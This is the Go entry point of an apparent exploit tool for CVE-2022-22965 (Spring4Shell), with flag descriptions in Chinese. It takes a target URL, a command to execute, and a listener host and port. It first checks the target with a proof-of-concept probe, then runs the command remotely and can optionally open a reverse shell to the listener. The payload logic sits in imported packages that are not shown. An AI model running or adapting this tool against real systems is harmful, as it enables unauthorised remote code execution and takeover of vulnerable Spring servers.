package main

import (
	"CVE-2022-22965/common"
	"CVE-2022-22965/util"
	"flag"
)

/**
 * @Author Lockly
 * @Description //TODO
 * @Date 0:52 2023/6/4
 * @return
 **/

func main() {
	var (
		cmd     string
		u       string
		host    string
		port    int
		reverse bool
	)
	flag.StringVar(&cmd, "c", "ls", "命令")
	flag.StringVar(&u, "u", "http://127.0.0.1:8080", "目标")
	flag.StringVar(&host, "lh", "127.0.0.1", "反弹监听地址")
	flag.IntVar(&port, "lp", 9999, "反弹监听端口")
	flag.BoolVar(&reverse, "r", false, "是否反弹shell")
	flag.Parse()
	if common.Poc(u) {
		util.Log.LogInfo("poc done! target has cve-2022-22965")
		util.Log.LogInfo("start exploting...")
		common.Exploit(u, cmd)
		if reverse != false {
			if port != 0 && len(host) != 0 {
				common.ReverseShell(u, port, host)
			} else {
				util.Log.LogError("please provide lhost and lport")
				return
			}
		}
		return
	} else {
		util.Log.LogError("target not vulnable!")
		return
	}
}
